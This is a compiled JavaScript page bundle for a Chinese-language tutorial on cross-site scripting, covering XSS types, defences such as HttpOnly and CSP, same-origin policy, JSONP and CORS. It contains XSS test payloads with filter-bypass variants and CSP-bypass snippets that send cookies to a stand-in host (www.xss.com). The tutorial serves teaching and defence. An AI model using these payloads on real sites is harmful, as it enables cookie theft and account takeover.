import{_ as p}from"./_plugin-vue_export-helper.cdc0426e.js";import{o,c,a as s,b as a,d as e,e as t,r}from"./app.ed2888ea.js";const l={},i=t(`<h2 id="漏洞概述" tabindex="-1"><a class="header-anchor" href="#漏洞概述" aria-hidden="true">#</a> 漏洞概述</h2><p><strong>漏洞成因</strong></p><p>当应用程序发送给浏览器的页面中包含用户提交的数据，但没有经过适当验证或转义时，就会导致跨站脚本漏洞。会造成Cookie窃取等危害。</p><p><strong>XSS漏洞的防御方法</strong></p><p>1）添加HTTP-only标头：禁止javascript读取敏感Cookie，即使攻击者能xss也不能获取Cookie</p><p>2）使用CSP浏览器内容安全策略白名单机制：对网站加载和执行的资源进行安全策略控制</p><p>3）代码层修复：控制输入输出的数据进行转义处理</p><h2 id="漏洞分类" tabindex="-1"><a class="header-anchor" href="#漏洞分类" aria-hidden="true">#</a> 漏洞分类</h2><div class="custom-container info"><p class="custom-container-title">反射型</p><p>出现在搜索栏，用户登录等地方，常用来窃取客户端的Cookie进行钓鱼欺骗</p><p>想要窃取cookie要满足两个条件：</p><p>1.用户点击攻击者构造的URL</p><p>2.访问被攻击的应用服务(即存在xss的网站)</p></div><div class="custom-container danger"><p class="custom-container-title">存储型</p><p>出现在留言、评论、博客日志等交互处，直接影响Web服务器自身安全</p></div><div class="custom-container note"><p class="custom-container-title">DOM型</p><p>基于文档对象模型(Document Object Model)的一种漏洞；</p><p>DOM型与反射型类似，都需要攻击者诱使用户点击专门设计的URL；</p><p>Dom型 xss 是通过 url 传入参数去控制触发的；</p><p>Dom型返回页面源码中看不到输入的payload， 而是保存在浏览器的DOM中</p><p>假设应用程序返回的页面包含以下脚本：</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
  <span class="token keyword">var</span> url <span class="token operator">=</span> document<span class="token punctuation">.</span>location<span class="token punctuation">;</span>
  url <span class="token operator">=</span> <span class="token function">unescape</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> message <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">&#39;message=&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span>url<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
  document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>把 javascript 代码作为message的参数，这段代码将会被动态的写入到页面中，并像服务器返回代码一样得以执行。DOM型与反射 型类似，都需要攻击者诱使用户点击专门设计的URL</p></div><h2 id="查找验证xss漏洞" tabindex="-1"><a class="header-anchor" href="#查找验证xss漏洞" aria-hidden="true">#</a> 查找验证XSS漏洞</h2><p>一般来说就是找输入点的可控参数，比如搜索框、留言板、 登录 / 注册，构造payload发送，监控响应</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code>&quot;<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>把这个字符串提交给每个应用程序页面的每个参数；</p><p>同时监控它的响应，如果攻击字符串原样出现在响应中，就可能存在XSS漏洞。</p><p>许多应用可能会经过黑名单等简单的初步过滤，试图阻止XSS攻击； 可以通过编码等方式绕过：</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code>&quot;<span class="token operator">&gt;</span><span class="token operator">&lt;</span>ScRiPt<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>ScRiPt<span class="token operator">&gt;</span>
&quot;<span class="token operator">%</span>3e<span class="token operator">%</span>3cscript<span class="token operator">%</span><span class="token number">3</span><span class="token function">ealert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">%</span>3c<span class="token operator">/</span>script<span class="token operator">%</span>3e
&quot;<span class="token operator">&gt;</span><span class="token operator">&lt;</span>scr<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>ipt<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scr<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>ipt<span class="token operator">&gt;</span>
<span class="token operator">%</span><span class="token number">00</span>&quot;<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="或者直接web漏扫" tabindex="-1"><a class="header-anchor" href="#或者直接web漏扫" aria-hidden="true">#</a> 或者直接Web漏扫</h4>`,19),u={href:"https://github.com/evilcos/xssor2",target:"_blank",rel:"noopener noreferrer"},d={href:"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet",target:"_blank",rel:"noopener noreferrer"},k=t(`<h2 id="csp内容安全策略" tabindex="-1"><a class="header-anchor" href="#csp内容安全策略" aria-hidden="true">#</a> CSP内容安全策略</h2><h3 id="两种方法启用csp" tabindex="-1"><a class="header-anchor" href="#两种方法启用csp" aria-hidden="true">#</a> 两种方法启用CSP</h3><p>1）添加HTTP头部信息</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Content-Security-Policy</span><span class="token punctuation">:</span> <span class="token header-value csp languages-csp">script-src &#39;self&#39;;object-src &#39;none&#39;;style-src cdn.example.org; child-src https;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>2）使用 meta 标签</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Content-Security-Policy<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>script-src &#39;self&#39;;object-src &#39;none&#39;;style-src cdn.example.org;child-src https;<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

script-src(脚本)：只信任当前域名
object-src(标签)：不信任任何URL，即不加载任何资源
样式表：只信任http://cdn.example.org
框架（frame）：必须使用HTTPS协议加载
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="绕过csp" tabindex="-1"><a class="header-anchor" href="#绕过csp" aria-hidden="true">#</a> 绕过CSP</h3><p>1）URL跳转</p><p>在<code>default-src &#39;none&#39;</code>的情况下，可以使用meta标签实现跳转</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>refresh<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>1;url=http://www.xss.com/x.php?c=[cookie]<span class="token punctuation">&quot;</span></span> <span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
 window<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">&quot;http://www.xss.com/x.php?c=[cookie]&quot;</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2）ifrmae</p><p>如页面A有CSP限制，但页面B没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>B<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code>例如&quot;http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">csp</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>script-src &#39;unsafe-inline&#39;<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://xxx<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="同源策略" tabindex="-1"><a class="header-anchor" href="#同源策略" aria-hidden="true">#</a> 同源策略</h2><div class="custom-container tip"><p class="custom-container-title">提示</p><p>同源策略是目前所有浏览器都实行的一种安全策略，只有发布Cookie的网站才能读取Cookie。</p><p>A网页设置的 Cookie，B网页不能读取，除非这两个网页同源。</p><p>所谓同源，是指：两个网页，协议(protocol)、端口(port)、和主机(host)都相同</p></div><p>如果非同源，以下三种行为受到限制</p><blockquote><p>(1) Cookie、LocalStorage无法读取</p><p>(2) DOM 无法获得</p><p>(3) AJAX 请求不能发送</p></blockquote><details class="custom-container details"><summary>如果子域名和顶级域名不同源，在哪里可以设置让他们同源？</summary><p>两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置<code>document.domain</code>属性共享 Cookie，拿到DOM等。</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// 对于文档 www.example.com/good.html</span>
<span class="token comment">// 在根域范围内，可以 把domain属性的值设置为它的上一级域</span>
document<span class="token punctuation">.</span>domain <span class="token operator">=</span> <span class="token string">&quot;example.com&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> domain <span class="token operator">=</span> document<span class="token punctuation">.</span>domain<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h3 id="如何规避同源策略" tabindex="-1"><a class="header-anchor" href="#如何规避同源策略" aria-hidden="true">#</a> 如何规避同源策略？</h3><ul><li>JSONP (参数式JSON)</li><li>CORS (跨域资源共享)</li></ul><p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。</p><p>JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p><h3 id="jsonp" tabindex="-1"><a class="header-anchor" href="#jsonp" aria-hidden="true">#</a> JSONP</h3><p>JSON with Padding，是服务器与客户端跨源通信的常用方法。</p><p>JSONP原理就是动态插入带有跨域url的<code>&lt;script&gt;</code>标签，然后调用回调函数。</p><h3 id="cors" tabindex="-1"><a class="header-anchor" href="#cors" aria-hidden="true">#</a> CORS</h3><p>Cross-Origin Resource Sharing，允许浏览器向跨源服务器发出<code>XMLHttpRequest</code>请求。</p><p>它是W3C标准，是跨源AJAX请求的根本解决方法。</p><p>CORS请求大致和ajax请求类似，但是在HTTP头信息中加上了Origin字段表明请求来自哪个源。</p><p>如果 origin 是许可范围之内的话，服务器返回的响应会多出Access-Control-Allow-*的字段</p><h4 id="cors简单请求" tabindex="-1"><a class="header-anchor" href="#cors简单请求" aria-hidden="true">#</a> CORS简单请求</h4><p>只要同时满足以下两大条件，就属于简单请求</p><p>1）请求方法是以下三种方法之一</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>GET
POST
HEAD
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2）HTTP的头信息不超出以下几种字段</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>Accept
Accept-Language
Content-Language
Last-Event-ID
Content-Type：application/x-www-form-urlencoded,multipart/form-data,text/plain 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/cors</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://api.b.com</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">api.a.com</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Origin字段用来说明本次请求来自哪个源（协议 + 域名 + 端口）</p><p>服务器根据这个值，决定是否同意这次请求</p><p>响应字段，可请求资源范围 <code>Access-Control-Allow-Origin：*</code> 表示同意任意跨源请求</p><details class="custom-container details"><summary>简单请求有三个重要的响应头</summary><p>(1) <strong>Access-Control-Allow-Origin</strong></p><p>该字段是必须的,它的值要么是请求时Origin字段的值，要么是一个<code>*</code>，表示接受任意域名的请求</p><p>(2)<strong>Access-Control-Allow-Credentials</strong></p><p>该字段可选,它的值是一个布尔值，表示是否允许发送Cookie。</p><p>默认情况下，Cookie不包括在CORS请求之中。</p><p>设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。</p><p>这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可</p><p>(3) <strong>Access-Control-Expose-Headers</strong></p><p>可选字段，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定</p><p>例如，getResponseHeader(&#39;wintrysec&#39;)可以返回wintrysec字段的值</p></details><h4 id="cors非简单请求" tabindex="-1"><a class="header-anchor" href="#cors非简单请求" aria-hidden="true">#</a> CORS非简单请求</h4><p>对服务器有特殊要求的请求，比如PUT方法，自定义HTTP-HEAD头部等；</p><p>非简单请求会在正式通信之前增加一次HTTP查询请求，称为&quot;预检&quot;请求；</p><p>预检请求用OPTIONS方法询问服务器允许的方法。</p><details class="custom-container details"><summary>预检请求的头信息包括两个特殊字段</summary><p><strong>(1)Access-Control-Request-Method</strong></p><p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法.</p><p><strong>(2)Access-Control-Request-Headers</strong></p><p>指定浏览器<strong>CORS</strong>请求会额外发送的<strong>http</strong>头部信息字段，多个字段用逗号分隔</p></details><p>如果浏览器否定了&quot;预检&quot;请求，会返回一个正常的HTTP回应，但是没有任何<strong>CORS</strong>相关的头信息字段响应</p><p>服务器响应的其他<strong>CORS</strong>相关字段如下：</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code>Access<span class="token operator">-</span>Control<span class="token operator">-</span>Allow<span class="token operator">-</span>Methods<span class="token operator">:</span> GET<span class="token punctuation">,</span> POST<span class="token punctuation">,</span> PUT        <span class="token comment">//服务器支持的所有跨域请求的方法</span>
Access<span class="token operator">-</span>Control<span class="token operator">-</span>Allow<span class="token operator">-</span>Headers<span class="token operator">:</span> X<span class="token operator">-</span>Custom<span class="token operator">-</span>Header       <span class="token comment">//服务器支持的所有头信息字段</span>
Access<span class="token operator">-</span>Control<span class="token operator">-</span>Allow<span class="token operator">-</span>Credentials<span class="token operator">:</span> true              <span class="token comment">//表示是否允许发送Cookie</span>
Access<span class="token operator">-</span>Control<span class="token operator">-</span>Max<span class="token operator">-</span>Age<span class="token operator">:</span> <span class="token number">1728000</span>                     <span class="token comment">//用来指定本次预检请求的有效期，单位为秒</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>一旦服务器通过了&quot;预检&quot;请求，以后每次浏览器正常的<strong>CORS</strong>请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个<strong>Access-Control-Allow-Origin</strong>头信息字段</p>`,55);function m(v,g){const n=r("ExternalLinkIcon");return o(),c("div",null,[i,s("p",null,[a("XSS前端编码："),s("a",u,[a("https://github.com/evilcos/xssor2 "),e(n)])]),s("p",null,[a("Xss-cheat-sheet： "),s("a",d,[a("https://portswigger.net/web-security/cross-site-scripting/cheat-sheet "),e(n)])]),k])}const x=p(l,[["render",m],["__file","XSS跨站脚本攻击.html.vue"]]);export{x as default};
